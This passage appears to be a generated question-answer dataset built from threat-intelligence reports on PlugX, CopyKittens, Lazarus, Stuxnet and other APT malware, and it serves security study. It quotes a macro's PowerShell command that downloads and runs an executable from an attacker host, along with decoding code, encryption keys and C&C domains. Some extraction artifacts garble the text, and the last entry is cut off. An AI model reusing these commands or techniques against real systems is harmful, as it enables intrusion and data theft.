    "instruction": "Big Headline: Size Expansion of Configuration Information\nPlugX is designed to run based on its configuration information stored in itself. Our analysis revealed that the size of the configuration information has been expanded for the recent variant. While the former ones have either 0x2540 bytes (Observed since August 2013) or 0x2d58 bytes (Observed since June 2014), the recent one has 0x36a4 bytes, roughly 20% larger in size. This has led it to do more, such as:\n- Communication with more C&C servers \u2013 up to 16\n- P2P communication between infected nodes\n- MAC address check - PlugX runs if the MAC address of an infected host coincides with configuration information in itself (If not specified in the configuration, PlugX runs on any host).\n- (To bypass UAC) configurable setting for the process to abuse\nOther than these, new coding algorithm has been introduced.\nI will pick up some of the interesting features for more description. For details of the configuration file, you can refer to Appendix A in the bottom of this post.\nBig Headline: Additional Communication Protocol for C&C Servers\nFormer versions of PlugX used to set four C&C Server addresses to communicate with. With the P2P PlugX, attackers can set up to 16 C&C servers. Communication protocol with C&C servers has also been improved.\nFormer PlugX could only configure four communication protocols, but for P2P PlugX, protocol number 255 became available. This protocol is reserved by IANA, but no specific application is assigned.\nTable 1: Configurations and Communication Protocol which\nTable 1: Configurations and Communication Protocol which PlugX uses to connect to C&C Servers\nBig Headline: P2P Function Enabled\nP2P PlugX can communicate with other similarly-infected hosts. When one PlugX succeeds to infect a host, it then accesses to every IP address in the local network one-by-one and communicate with any connectable nodes, using one of the following protocols listed in Table 2.\nTable 2: Configurations and Communication Protocols which P2P PlugX uses to communicate by P2P\nWith P2P protocol, even if a PlugX exists in an environment with no direct access to the Internet, it may communicate with C&C server through other infected hosts. We have also seen some P2P-disabled samples.\nNote that this P2P communication theoretically can be applied to any other TCP/UDP ports. But in cases which JPCERT/CC has observed, P2P PlugX only uses either TCP/1357 or UDP/1357 for P2P communication. If you see any scanning activity to TCP/1357 or UDP/1357, we highly recommend that you conduct further investigation.\nBig Headline: New Encoding Algorithm\nPlugX uses a single encoding algorithm for inbound/outbound data, configuration, key logging data and strings used internally. Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself.\nLikewise, P2P PlugX has a new encoding algorithm. Here's a python code to decode.\ndef plugx_decode(data):\ndecode_key = struct.unpack_from('<I', data, 0)[0]    out = ''\n# XOR Values might possibly be varied.     key1 = decode_key ^ 20140918     key2 = decode_key ^ 353\nfor c in data[4:]:\n# ADD/SUB Values might possibly be varied.\nkey2 -= 39779\ndec = int(c) ^ (((key2 >> 16) & 0xff ^ ((key2 & 0xff ^ (((key1 >> 16) & 0xff ^ (key1 - (key1 >> 8) & 0xff)) - (key1 >> 24) & 0xff)) - (key2 >> 8) & 0xff)) - (key2 >> 24) & 0xff)        out = out + chr(dec)\nreturn out\n\nBased on the above text, answer a question. What is the purpose of the new encoding algorithm introduced in the P2P PlugX variant, and how does it differ from previous versions? Provide an example of how this algorithm works.",
    "output": "The new encoding algorithm in the P2P PlugX variant is used to encode and decode inbound/outbound data, configuration information, keylogging data, and internal strings. This encoding method has been updated to align with the major upgrade of PlugX, enhancing its security and obfuscation capabilities. The algorithm uses a combination of XOR operations and arithmetic shifts to encode data. An example of the decoding process in Python is as follows:\\n\\ndef plugx_decode(data):\\n    decode_key = struct.unpack_from('<I', data, 0)[0]\\n    out = ''\\n    key1 = decode_key ^ 20140918\\n    key2 = decode_key ^ 353\\n    for c in data[4:]:\\n        key2 -= 39779\\n        dec = int(c) ^ (((key2 >> 16) & 0xff ^ ((key2 & 0xff ^ (((key1 >> 16) & 0xff ^ (key1 - (key1 >> 8) & 0xff)) - (key1 >> 24) & 0xff)) - (key2 >> 8) & 0xff)) - (key2 >> 24) & 0xff)\\n        out = out + chr(dec)\\n    return out\\nThis algorithm demonstrates a more complex encoding scheme compared to previous versions, making it harder for analysts to reverse-engineer and understand the malware's behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Malicious Macros\nIn October 2016, the attackers uploaded to VirusTotal multiple files containing macros, likely to learn if they are detected by antivirus engines.\nFor example, \"Date.dotm\" contains this default Word template content:20\nThe macro runs a Cobalt Strike stager that communicates with wk-in-f104.1c100.n.microsoft-security[.]host .\nThe attackers also uploaded an executable files that would run a Word document with content in Hebrew.21\nHebrew decoy document\nThe word document contains a macro that runs the following command:\ncmd.exe /c powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://pht.is.nlb-deploy.edge-dyn.e11.f20.ads-youtube. online/winini.exe','%TEMP%\\XU.exe');&start %TEMP%\\XU.exe& exit\nIn parallel, the executable drops d5tjo.exe, which is the legitimate Madshi debugging tool 2223\n2(<https://www.virustotal.com/en/file/7e3c9323be2898d92666df33eb6e73a46c28e8e34630a2bd1db96aeb39586aeb/analysis/>)0\n2(<https://www.virustotal.com/en/file/9e5ab438deb327e26266c27891b3573c302113b8d239abc7f9aaa7eff9c4f7bb/analysis>)1\n2(<https://www.virustotal.com/en/file/7ad65e39b79ad56c02a90dfab8090392ec5ffed10a8e276b86ec9b1f2524ad31/analysis>)2\n2\nMedium Headline: Fake Social Media Entities\nBack in 2013, CopyKittens used several Facebook profiles to spread links to a website impersonating Haaretz news, an Israeli newspaper. In the screenshot below you can see the fake profile linking to haarettz.co[.]il (note the extra t in the domain).\n\"Erick Brown\"24\nFake profile \"Erik Brown\" posting link to malicious website\n\"Amanda Morgan\"25\n\u05d3\u05d9\u05d4\u05e0 \u05e8\u05e9\u05d5\u05df\n2\n2\n2\n\u05d2\u05e1\u05d9\u05e7\u05d4 \u05db\u05d4\u05df\n27\"\"cousinas her profile  Israeli tagged another faketurn in Who\nWhile \"Erik Brown\" has not been publicly active since September 2015, and the two other Israeli profiles have not been publicly active since September 2013, Amanda Morgan is still active to date. She has thousands of friends and 2,630 followers, many of which are Israeli. In 2015 she sent her friends an invitation to Like a Facebook page: \"Emet press.\"\nAmanda Morgan invites its friends to like \"Emet press\"\nEmet press (Emet means \"truth\" in Hebrew), is described as a non-biased news aggregator operated by Israeli students aboard. However, the Hebrew text is clearly not written by someone who speaks Hebrew as a first language:\nEmet press Facebook page\n2\nThe page re-posted news stories in Hebrew copied from online news outlets until August 2016. 28 An accompanying website with similar content was published in www.emetpress[.]com.\nEmet press website\nNeither the Facebook page nor website have been used to spread malicious or fake content publicly. We estimate that they were used to build trust with targets, and potentially send malicious content in private messages, however we do not have evidence of such activity.\nLooking at the website source code reveals that it was built with NovinWebGostar, a website building platform.\nNovinWebGostar belongs to an Iranian web development company with the same name.\n2\nMedium Headline: Web Hacking\nBased on logs from internet-facing web servers in target organizations, we have detected that CopyKittens use the following tools for web vulnerability scanning and SQL Injection exploitation.\nHavij: \"An automatic SQL Injection tool, [which is] distributed by ITSecTeam, an Iranian security company.\"29 Havij is freely distributed and has a graphical user interface. It is commonly used for automated SQL Injection and vulnerability assessments.\nsqlmap: An \"automatic SQL Injection and database takeover tool.\"30 sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL Injection flaws and taking over database servers. It is capable of database fingerprinting, data fetching from the database, and accessing the underlying file system and executing commands on the operating system via out-of-band connections.\nAcunetix: A commercial vulnerability scanner. \"Acunetix tests for SQL Injection, XSS, XXE, SSRF, Host Header Injection and over 3000 other web vulnerabilities.\"31\n2\n3\n3\nMedium Headline: Domains\nBelow is a list of domains that have been used for malware delivery, command and control, and hosting malicious websites since the beginning of the group's activity.32\n32 Some have been reported in our previous public reports\nNoteworthy observations about the domains:\n\u2022 Domains impersonate one of four categories:\n\u25aa Major internet and software companies and services \u2013 Microsoft, Google, Akamai, Cloudflare, Amazon, Oracle, Facebook, Cisco, Twitter, Intel\n\u25aa Security companies and products \u2013 Trend Micro, McAfee, Microsoft Defender, and potentially Cellebrite\n\u25aa Israeli organizations of interest to the victim \u2013 News originations, Israeli Prime Minister Office, an Israeli ISP\n\u25aa Other organizations or generic web services\n\u2022 The attackers always use Whoisguard for Whois details protection.33\n\u2022 Domains are usually registered in bulk every few months.\n\u2022 Long subdomains are created like those used by Content Delivery Networks. For example:\nwk-in-f104.1e100.n.microsoft-security[.]host ns1.static.dyn-usr.gsrv01.ssl-gstatic[.]online c20.jdk.cdn-external-ie.1e100.alkamaihd[.]net msnbot-sd7-46-194.microsoft-security[.]host ns2.static.dyn-usr.gsrv02.ssl-gstatic.online static.dyn-usr.g-blcse.d45.a63.alkamaihd[.]net ea-in-f155.1e100.microsoft-security[.]host is-cdn.edge.g18.dyn.usr-e12-as.akamaitechnology[.]com static.dyn-usr.f-login-me.c19.a23.akamaitechnology[.]com pht.is.nlb-deploy.edge-dyn.e11.f20.ads-youtube[.]online ae13-0-hk2-96cbe-1a-ntwk-msn.alkamaihd[.]com be-5-0-ibr01-lts-ntwk-msn.alkamaihd[.]com a17-h16.g11.iad17.as.pht-external.c15.qoldenlines[.]net\n\u2022 Some of the domains have been in use for more than two years.\n3\nOften the attackers would point malicious domains to IPs not in their control. For example, as can be seen in the screenshot below from PassiveTotal, multiple domains and hosts (marked red) were pointed to a non-malicious IP owned by Google.3435\nThis pattern was instrumental for us in pivoting and detecting further malicious domains.\nMultiple domains and hosts pointing to a non-malicious IP owned by Google\n3\n3\nMedium Headline: TDTESS Backdoor\nTDTESS (22fd59c534b9b8f5cd69e967cc51de098627b582) is 64-bit .NET binary backdoor that provides a reverse shell with an option to download and execute files. It routinely calls in to the command and control server for new instructions using basic authentication. Commands are sent via a web page. The malware creates a stealth service, which will not show on the service manager or other tools that enumerate services from WINAPI or Windows Management Instrumentation.\nVery Small Headline: Security descriptor:\nD:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLC SWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;F A;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\nThe hardcoded security descriptor used to create the service is a persistence technique. Interactive users, even if they are administrators, cannot stop or even see the service in services.msc snap-in.\nFollowing is a list of denied commands:\nservice_change_config\nservice_query_status\nservice_stop\nservice_pause_continue\ndelete\nTwo log files are created during the service installation, but deleted by the program. Following is their recovered content:\n<filename>.t.InstallLog\nAfter creating the service, it will update the file creation time to that of the following file:\n%windir%\\system32\\svchost.exe\nSmall Headline: Functionality\nThe service is started immediately after installation. After five minutes, it verifies internet connectivity by making a HTTP HEAD request to microsoft.com.\nThen it tries to access the C&C servers looking for commands.\nHardcoded HTTP parameters and URL\nAs a reply, TDTESS expects one of the following Bas64 encoded commands:\ngetnrun - download and execute a file. Parameters are drop, drop_path and t. runnreport - send information about the computer. Parameters are cmd and boss. wait - time to next interval to get data.\nGetnrun command and parameters\n\nAnswer this question based on the above context: What methods did CopyKittens employ to spread malicious links through social media, and how did they attempt to build trust with their targets?",
    "output": "CopyKittens used several Facebook profiles to spread links to a malicious website impersonating Haaretz, an Israeli newspaper. For example, a fake profile named 'Erik Brown' posted a link to haarettz.co[.]il. Another profile, 'Amanda Morgan', invited friends to like a Facebook page called 'Emet press', described as a non-biased news aggregator. Although these profiles and pages did not publicly spread malicious content, they were likely used to build trust with targets and potentially send malicious content privately. The 'Emet press' website was built using NovinWebGostar, an Iranian web development platform.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Conclusions\nLazarus is not just another APT actor. The scale of Lazarus operations is shocking. It has been on a growth spike since 2011 and activities didn't disappear after Novetta published the results of its Operation Blockbuster research. All those hundreds of samples that were collected give the impression that Lazarus is operating a factory of malware, which produces new samples via multiple independent conveyors.\nWe have seen it using various code obfuscation techniques, rewriting its own algorithms, applying commercial software protectors, and using its own and underground packers. Lazarus knows the value of quality code, which is why we normally see rudimentary backdoors being pushed during the first stage of infection. Burning those doesn't cause too much impact on the group. However, if the first stage backdoor reports an interesting infection it starts deploying more advanced code, carefully protecting it from accidental detection on disk. The code is wrapped into a DLL loader or stored in an encrypted container, or maybe hidden in a binary encrypted registry value. It usually comes with an installer that only the attackers can use, because they password protect it. It guarantees that automated systems - be it public sandbox or a researcher's environment - will never see the real payload.\nMost of the tools are designed to be disposable material that will be replaced with a new generation as soon as they are burnt. And then there will be newer, and newer, and newer versions. Lazarus avoids reusing the same tools, the same code, and the same algorithms. \"Keep morphing!\" seems to be its internal motto. Those rare cases when it is caught with the same tools are operational mistakes, because the group seems to be so large that one part doesn't know what the other is doing.\nAll this level of sophistication is something that is not generally found in the cybercriminal world. It's something that requires strict organization and control at all stages of the operation. That's why we think that Lazarus is not just another APT actor.\nOf course such a process requires a lot of money to keep running the business, which is why the appearance of the Bluenoroff subgroup within Lazarus was logical.\nBluenoroff, as a subgroup of Lazarus, is focused only on financial attacks. It has reverse engineering skills and spends time tearing apart legitimate software, implementing patches for SWIFT Alliance software, and finding ways and schemes to steal big money. Its malware is different and the attackers aren't exactly soldiers that hit and run. Instead they prefer to make an execution trace to be able to reconstruct and quickly debug the problem. They are field engineers that come when the ground is already cleared after the conquest of new lands.\nOne of Bluenoroff's favorite strategies is to silently integrate into running processes without breaking them. From the perspective of the code we've seen it looks as if it is not exactly looking for hit and run solutions when it comes to money theft. Its solutions are aimed at invisible theft without leaving a trace. Of course, attempts to move around millions of USD can hardly remain\nunnoticed but we believe that its malware might now be secretly deployed in many other places - and it doesn't trigger any serious alarms because it's much more quiet.\nWe would like to note, that in all the observed attacks against banks that we have analyzed, servers used to connect to SWIFT didn't demonstrate or expose any specific vulnerability. The attacks were focused on the banks' infrastructure and staff, exploiting vulnerabilities in commonly used software or websites, bruteforcing passwords, using keyloggers and elevating privileges. However, the design of inter-banking transactions using a bank's own server running SWIFT connected software suggests that there are personnel responsible for the administration and operation of the SWIFT connected server. Sooner or later the attackers find these users, gain their necessary privileges and access the server connected to the SWIFT messaging platform. With administrative access to the platform, they can manipulate the software running on the system as they wish. There is not much that can stop them, because from a technical perspective it may not differ from what authorized and qualified engineers do: starting and stopping services, patching software, or modifying databases.\nTherefore, in the breaches we analyzed, SWIFT as an organization hasn't been directly at fault. More than that, we have witnessed SWIFT trying to protect its customers by implementing the detection of database and software integrity issues. We believe that this is the right direction and has to be extended with full support. Complicating patches of integrity checks further may create a serious threat to the success of further operations run by Lazarus/Bluenoroff against banks worldwide.\nTo date, the Lazarus/Bluenoroff group has been one of the most successful in large scale operations against financial industry. We believe that it will remain one of the biggest threats to the banking sector, finance and trading companies as well as casinos, for years to come.\nAs usual, defense against attacks such as those from Lazarus/Bluenoroff should include a multi-layered approach. Kaspersky Lab products include special mitigation strategies against this group, as well as many other APT groups we track. If you are interested in reading more about effective mitigation strategies in general, we recommend the following articles:\n\u25cf\n\u25cf\nWe will continue tracking the Lazarus/Bluenoroff actor and will share new findings with our intel report subscribers as well as with the general public. If you would like to be among the first to hear our news, we suggest you subscribe to our intel reports.\nFor more information, contact: intelreports@kaspersky.com.\nMedium Headline: Malware 1: SWIFT transactions Information Harvester (New Runoff)\nMD5: 0abdaebbdbd5e6507e6db15f628d6fd7\nDiscovered path: C:\\MSO10\\fltmsg.exe\nDate: 2016.08.18 23:44:21\nSize: 90'112 bytes\nCompiled on: 2016.08.18 22:24:41 (GMT)\nLinker version: 10.0\nType: PE32 executable (GUI) Intel 80386, for MS Windows\nInternal Bluenoroff module tag: NR\nUsed in: Incident #1\nAn almost identical file was found in another location with the following properties:\nMD5: 9d1db33d89ce9d44354dcba9ebba4c2d\nDiscovered path: D:\\Alliance\\Entry\\common\\bin\\win32\\nroff.exe\nDate detected: 2016-08-12 22:24:19\nSize: 89'088 bytes\nCompiled on: 2016.08.12 12:25:02 (GMT)\nType: PE32 executable (GUI) Intel 80386, for MS Windows\nInternal module mark: NR\nThe compilation timestamp indicates the malware was compiled exactly one day before being used in the bank.\nThe module starts from creating a \"MSO10\" directory on the logical drive where the Windows system is installed, i.e. C:\\MSO10. Also, it crafts several local filepaths, the purpose of which isn't clear. Not all have reference in the code and they could be copy-pasted code or part of a common file in the framework. The paths are represented with the following strings:\n\u25cf %DRIVE%:\\MSO10\\LATIN.SHP\n\u25cf %DRIVE%:\\MSO10\\ENGDIC.LNG\n\u25cf %DRIVE%:\\MSO10\\ADDT.REF\n\u25cf %DRIVE%:\\MSO10\\MSE.LIV\nUpon starting it makes five attempts to read file C:\\MSO10\\LATIN.SHP with an interval of 100ms. If the LATIN.SHP container is not found or has an invalid signature, the log record will contain the following message: \"NR-PR\", which we assume indicates a PRoblem loading module codenamed \"NR\". The name \"NR\" is probably a reference to the printer helper program called \"nroff\" used by SWIFT Alliance software. The origins of the nroff name go back to a Unix text-formatting program .\nThe file is read successfully if its size is larger than or equal to a hardcoded value of 35,260 bytes. After that the module decrypts the file with an RC4 algorithm using a hardcoded encryption key:\nSmall Headline: 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF.\nThis hardcoded key is quite unique and has been discovered in few other places, including in other tools from the set of malware used to attack SWIFT Alliance software and within the Wiper Tool discovered in Bangladesh in early 2016 (MD5: 5d0ffbc8389f27b0649696f0ef5b3cfe). It was also used in another tool to encrypt configuration files as by BAE Systems.\nThe decrypted data from the file is validated by checking the magic header of the data, which should be 0xA0B0C0D0 value. The file contains a configuration of 35,260 bytes which is copied to a reserved memory and a sequence of data blocks of 1096 bytes each. The number of blocks may vary, the module reads them all and stores them in a linked list structure.\nThere is an internal logging feature implemented in the current module, which keeps a text log in C:\\MSO10\\ENGDIC.LNG. The text records are stored in lines of the following format: [%Hour%:%Minute%:%Second%] [%Process_PID%] %Message%\\r\\n\nThe message may contain the following prefixes:\n\u25cf [ERROR]\n\u25cf [INFO]\n\u25cf [WARNING]\nThis executable is designed to be called with three parameters:\n\nWhy does the Lazarus group often use rudimentary backdoors during the initial stages of infection? How does this strategy benefit their operations?",
    "output": "The Lazarus group uses rudimentary backdoors during the initial stages of infection because these backdoors are easily replaceable and do not significantly impact the group if they are detected and 'burnt.' This strategy allows the group to deploy more advanced and carefully protected code once they determine that the infection is valuable. By initially using simple backdoors, Lazarus minimizes the risk of exposing their more sophisticated tools, ensuring that their primary assets remain undetected and operational.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 4.3 Stuxnet Bot Configuration Data\nStuxnet stores its encrypted configuration data (1860 bytes) in %WINDIR%\\inf\\mdmcpq3.pnf. A decryption algorithm is presented in Appendix A. These data contain information about:\nURLs of C&C servers (see figure below);\nActivation time \u2013 the time and date after which the worm is active;\nDeactivation time \u2013 the time after which the worm becomes inactive and deletes itself;\nVersion of the malware;\nThe minimum quantity of files that the removable drive should contain to drop malicious .LNK files successfully;\nOther information about its propagation and functioning.\nMedium Headline: 4.4 Remote Communication Protocol\nThe malware communicates to the C&C server through http. A list of URLs is included in the Stuxnet configuration data of Stuxnet:\nwww.windowsupdate.com;\nwww.msn.com;\nwww.mypremierfutbol.com;\nwww.todaysfutbol.com\nThe first two URLs are used to check that the system has connection to the Internet, while the third and the fourth are URLs of C&C servers. If it fails to successfully establish connection with the remote host (www.windowsupdate.com) it stops sending data to the C&C server.\nWhen the malware confirms that the infected computer is connected to the Internet it sends an http request to the remote server. Here is an example of the URL with data:\nhttp:// www.mypremierfutbol.com/index.php?data=data_to_send,\nwhere data_to_send is encrypted and encoded message.\nIt uses a custom encryption algorithm with a key length equal 31 bytes:\n// Encryption\nchar Key[31] = { 0x67, 0xA9, 0x6E, 0x28, 0x90, 0x0D, 0x58, 0xD6, 0xA4, 0x5D, 0xE2, 0x72, 0x66, 0xC0, 0x4A, 0x57, 0x88, 0x5A, 0xB0, 0x5C, 0x6E, 0x45, 0x56, 0x1A, 0xBD, 0x7C, 0x71, 0x5E, 0x42, 0xE4, 0xC1 };\n// Encryption procedure\nvoid EncryptData(char *Buffer, int BufferSize, char *Key)\n{\nfor (int i = 0 ; i < BufferSize ; i ++)\nBuffer[i] ^= Key[i % 31];\nreturn;\n}\nThe encrypted data are represented as a string of Unicode characters: each byte of the binary data is presented as 2 characters. For instance, 0x7A96E2890 will be written as \"7A96E2890\" Unicode string.\nThe data to be sent have the following structure:\nThe first byte of the data is a hexadecimal constant 0x01, followed by 16 bytes of the malware configuration data. The IP address of the host is the first non-loopback entry in the list of IPv4 addresses of the host sorted in the ascending order.\nWhile preparing the data to be sent the malware gathers information about all the network adapters installed on the system by calling the GetAdaptersInfo API. This includes:\nThe adapter name;\nThe adapter description;\nThe hardware address of the adapter;\nThe list of IPv4 addresses associated with the adapter;\nThe IPv4 address of the gateway for the adapter;\nThe IPv4 address of the DHCP server for the adapter;\nThe IPv4 address of the primary WINS server;\nThe IPv4 address of the secondary WINS server;\nThe message field can be described with the following structure:\nstruct STUXNET_CC_MESSAGE\n{\nWe can see that flags corresponding to the first and the last bits in the byte are unused. Flags 1,4,5,6 are related to the configuration data of the malware. Flag 2 signifies whether Stuxnet is active. Flag 3 is set in case Stuxnet detects Siemens software installed on the infected machine, which it does by searching in the registry the following keys and values:\nKey \u2013 HKLM\\SOFTWARE\\SIEMENS\\STEP7, value \u2013 STEP7_Version;\nKey \u2013 HKLM\\SOFTWARE\\SIEMENS\\WinCC\\Setup, value \u2013 Version.\nWhen the message is constructed, the malware encrypts it by XORing each byte with the hexadecimal constant 0xFF.  The malware receives a response from the C&C server which is structured as follows:\nThe first four bytes of the response store the size of the image in the received data: if image size plus 5 bytes isn't equal to the size of the received data, then Stuxnet stops parsing the response. On receiving the response the malware loads the image and call its export with ordinal number 1. The fifth byte of the response specifies exactly how it should be executed. If this byte is set to 0x01, then an RPC function will be called and as a result the received image will be executed at the address of the process hosting Stuxnet's RPC server. If the fifth byte is zero, then the image will be loaded into the address space of this process and an export function numbered as 1 will be executed. The following figure clarifies this mechanism:\nQ: How does Stuxnet ensure secure communication with its Command and Control (C&C) servers? Describe the encryption process and the structure of the data being sent.",
    "output": "Stuxnet ensures secure communication with its C&C servers by using a custom encryption algorithm with a key length of 31 bytes. The encryption procedure involves XORing each byte of the buffer with the corresponding byte of the key modulo 31. The encrypted data is then represented as a string of Unicode characters, where each byte of the binary data is presented as two characters. The data to be sent starts with a hexadecimal constant 0x01, followed by 16 bytes of the malware configuration data. The IP address of the host is determined by sorting the list of IPv4 addresses in ascending order and selecting the first non-loopback entry. The malware gathers information about all network adapters installed on the system using the GetAdaptersInfo API, including adapter names, descriptions, hardware addresses, and various IPv4 addresses.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the joint venture between AECC and Russia's United Aircraft Corp (UAC) for the CR929 aircraft potentially expose foreign suppliers to cyber-enabled intellectual property theft, and what role might China-based adversaries play in this scenario?",
    "output": "The joint venture between AECC and UAC for the CR929 aircraft involves taking bids for an aircraft engine until a Chinese-Russian substitute can be developed. This process exposes foreign suppliers to potential targeting by China-based adversaries who have demonstrated the capability and intent to engage in intellectual property theft for economic gain. These adversaries may attempt to steal proprietary information related to the CR929's engines, onboard electrical systems, and other components, which are likely to be supplied by foreign companies. It is unclear whether Russia, which also has experienced cyber operators, would engage in similar activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: In Operation Beebus, how does the malware achieve persistence on a compromised Windows system? Explain the mechanism and the specific vulnerability it exploits.",
    "output": "The malware achieves persistence by exploiting a well-documented vulnerability in the Windows OS known as DLL search order hijacking. This vulnerability allows the malware to take advantage of the order in which executables load DLLs. Specifically, the malware drops a DLL called ntshrui.DLL in the C:\\\\Windows directory. Since the first place from where the executable looks to load the DLL is its own directory, placing the ntshrui.DLL in the C:\\\\Windows directory ensures that the malicious DLL is loaded instead of the legitimate one, thereby achieving persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What specific information did the 'phakeddb' schema contain, and how was it used by the Rocket Kitten group in their phishing campaigns?",
    "output": "The 'phakeddb' schema contained several tables, including 'users', 'conversation', 'requiretypes', 'projects', 'projectmailrequirevalues', and 'projectlogs'. The 'users' table listed the attackers who logged into the system, with some using easily crackable passwords like '123456'. The 'projects' table contained records of all victims targeted by the group, including their email addresses and specific phishing links. The 'projectmailrequirevalues' table held template values for phishing pages, such as full names and photos of victims. The 'projectlogs' table logged every access to phishing pages, including any credentials provided by the victims.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Describe the capabilities of the Surtr malware and how it communicates with its command and control server (C2)?",
    "output": "Surtr's capabilities include listing file directories and contents on the victim computer and any USB drives connected to a victim machine, viewing web cache, executing remote commands, and logging keystrokes. It communicates with a C2 server, such as internet.3-a.net on port 9696, to download a stage two component to %ALL USERS%/Application Data/Microsoft/Windows/Burn/_[VICTIM COMPUTER NAME].log. The stage two component, often named x86_GmRemote.dll or Remote.dll, enables further functionalities. The data collected by Surtr is compressed using zlib DEFLATE and sent to the C2, making the network traffic not human-readable without decompression.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2010: The emergence of CosmicDuke in the Caucasus\nThe spring of 2010 saw continued PinchDuke campaigns against Turkey and Georgia, but also numerous campaigns against other members of the Commonwealth of Independent States such as Kazakhstan, Kyrgyzstan, Azerbaijan and Uzbekistan. Of these, the campaign with the identifier \"kaz_2010_07_30\", which possibly targeted Kazakhstan, is of note because it is the last PinchDuke campaign we have observed. We believe that during the first half of 2010, the Dukes slowly migrated from PinchDuke and started using a new infostealer malware toolset that we call CosmicDuke.\nThe first known sample of the CosmicDuke toolset was compiled on the 16th of January 2010. Back then, CosmicDuke still lacked most of the credential-stealing functionality found in later samples. We believe that during the spring of 2010, the credential and file stealing capabilities of PinchDuke were slowly ported to CosmicDuke, effectively making PinchDuke obsolete.\nDuring this period of transition, CosmicDuke would often embed PinchDuke so that, upon execution, CosmicDuke would write to disk and execute PinchDuke. Both PinchDuke and CosmicDuke would then operate independently on the same compromised host, including performing separate information gathering, data exfiltration and communication with a command and control (C&C) server - although both malware would often use the same C&C server. We believe the purpose of this parallel use was to 'fieldtest' the new CosmicDuke tool, while at the same time ensuring operational success with the tried-and-tested PinchDuke.\nDuring this period of CosmicDuke testing and development, the Duke authors also started experimenting with the use of privilege escalation vulnerabilities. Specifically, on the 19th of January 2010 security researcher Tavis Ormandy disclosed a local privilege escalation vulnerability (CVE-2010-0232) affecting Microsoft Windows. As part of the disclosure, Ormandy also included the source code for a proof-of-concept exploit for the vulnerability . Just 7 days later, on the 26th of January, a component for CosmicDuke was compiled that exploited the vulnerability and allowed the tool to operate with higher privileges.\nOne loader to load them all (almost)\nIn addition to all the other components being produced by the Dukes group, in 2010 they were also actively developing and testing a new loader - a component that wraps the core malware code and provides an additional layer of obfuscation.\nThe first sample of this loader was compiled on the 26th of July 2010, making it a direct predecessor of what has since become known as the \"MiniDuke loader\", as later versions were extensively used by both MiniDuke and CosmicDuke.\nSome hints about the history of the \"MiniDuke loader\" were noted in the CosmicDuke whitepaper we published  in 2014, where we observed that the loader appeared to have been in use with CosmicDuke before it was used with MiniDuke. In fact, we now know that before being used with either, the \"MiniDuke loader\" was used to load PinchDuke. The first known sample of the loader was used during the summer of 2010, while the most recent samples were seen during the spring of 2015.\nThis neatly ties together many of the tools used by the Dukes group, as versions of this one loader have been used to load malware from three different Dukes-related toolsets \u2013 CosmicDuke, PinchDuke, and MiniDuke \u2013 over the course of five years.\nIMAGE 2: COMPARING WHOIS REGISTRATION DETAILS\nLeft - Original whois registration details for natureinhome.com, one of the Duke C&C server domains registered on the 29th of January, 2011 to \"John Kasai\"\nRight - Details for the domain were later changed, providing a small glimpse of the Dukes' sense of humor\n\nWhy did the Dukes group transition from using PinchDuke to CosmicDuke in 2010, and how did they ensure operational continuity during this migration?",
    "output": "A: The Dukes group transitioned from PinchDuke to CosmicDuke in 2010 to take advantage of new capabilities and improve their toolset. During the migration, they ensured operational continuity by embedding PinchDuke within CosmicDuke. This allowed both malware to operate independently on the same compromised host, performing separate information gathering, data exfiltration, and communication with a command and control (C&C) server. This parallel use enabled the Dukes to 'field-test' the new CosmicDuke tool while maintaining operational success with the proven PinchDuke.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Before the Gunfire, Cyberattacks\nWeeks before bombs started falling on Georgia, a security researcher in suburban Massachusetts was watching an attack against the country in cyberspace.\nJose Nazario of Arbor Networks in Lexington noticed a stream of data directed at Georgian government sites containing the message: \"win+love+in+Rusia.\"\nOther Internet experts in the United States said the attacks against Georgia's Internet infrastructure began as early as July 20, with coordinated barrages of millions of requests \u2014 known as distributed denial of service, or D.D.O.S., attacks \u2014 that overloaded and effectively shut down Georgian servers.\nResearchers at Shadowserver, a volunteer group that tracks malicious network activity, reported that the Web site of the Georgian president, Mikheil Saakashvili, had been rendered inoperable for 24 hours by multiple D.D.O.S. attacks. They said the command and control server that directed the attack was based in the United States and had come online several weeks before it began the assault.\nAs it turns out, the July attack may have been a dress rehearsal for an all-out cyberwar once the shooting started between Georgia and Russia. According to Internet technical experts, it was the first time a known cyberattack had coincided with a shooting war.\nBut it will likely not be the last, said Bill Woodcock, the research director of the Packet Clearing House, a nonprofit organization that tracks Internet traffic. He said cyberattacks are so inexpensive and easy to mount, with few fingerprints, they will almost certainly remain a feature of modern warfare.\n\"It costs about 4 cents per machine,\" Mr. Woodcock said. \"You could fund an entire cyberwarfare campaign for the cost of replacing a tank tread, so you would be foolish not to.\"\nExactly who was behind the cyberattack is not known. The Georgian government blamed Russia for the attacks, but the Russian government said it was not involved. In the end, Georgia, with a population of just 4.6 million and a relative latecomer to the Internet, saw little effect beyond inaccessibility to many of its government Web sites, which limited the government's ability to spread its message online and to connect with sympathizers around the world during the fighting with Russia.\nIt ranks 74th out of 234 nations in terms of 